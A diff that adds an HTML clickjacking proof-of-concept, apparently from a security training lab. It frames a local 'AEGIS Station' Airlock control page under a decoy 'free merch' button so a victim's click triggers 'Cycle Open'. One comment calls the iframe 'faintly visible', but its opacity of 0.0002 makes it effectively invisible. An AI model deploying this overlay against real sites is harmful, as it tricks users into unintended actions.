@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<!--
+  LawCypenLab :: AEGIS STATION — clickjacking proof-of-concept.
+
+  FOR AUTHORIZED SECURITY TRAINING USE ONLY.
+
+  Open this file directly in a browser (as its own page, NOT served by
+  the Flask app) while logged into AEGIS Station in another tab. It
+  frames the live Airlock control page and overlays a decoy "Claim your
+  free station merch" button directly on top of the real "Cycle Open"
+  button. Clicking the decoy really clicks the framed Airlock control,
+  because the app never sends X-Frame-Options / frame-ancestors.
+
+  If the target app is not running on http://127.0.0.1:5000, update the
+  iframe src below to match.
+-->
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Free Station Merch — Click to Claim!</title>
+<style>
+  body { font-family: sans-serif; background: #fafafa; }
+  .decoy-wrap {
+    position: relative;
+    width: 900px;
+    margin: 60px auto;
+  }
+  iframe {
+    width: 900px;
+    height: 700px;
+    border: 2px dashed red;
+    opacity: 0.0002; /* effectively invisible in a real attack; kept
+                         faintly visible here on purpose for teaching */
+    position: absolute;
+    top: 0;
+    left: 0;
+  }
+  .decoy-button {
+    position: absolute;
+    top: 260px;   /* lines this up with the first "Cycle Open" button —
+                     adjust to taste/screen size */
+    left: 60px;
+    z-index: 2;
+    padding: 16px 28px;
+    background: #ff5c5c;
+    color: white;
+    font-weight: bold;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    font-size: 16px;
+  }
+  .note {
+    max-width: 900px;
+    margin: 0 auto 20px;
+    font-family: monospace;
+    font-size: 13px;
+    color: #666;
+  }
+</style>
+</head>
+<body>
+  <div class="note">
+    Training PoC — the red dashed border marks the framed AEGIS Station
+    iframe underneath the decoy button. In a real attack the iframe
+    would be fully transparent (opacity: 0) and pixel-aligned so the
+    victim never sees it.
+  </div>
+  <div class="decoy-wrap">
+    <button class="decoy-button">🎁 Claim Your Free Station Merch!</button>
+    <iframe src="http://127.0.0.1:5000/airlock"></iframe>
+  </div>
+</body>
+</html>
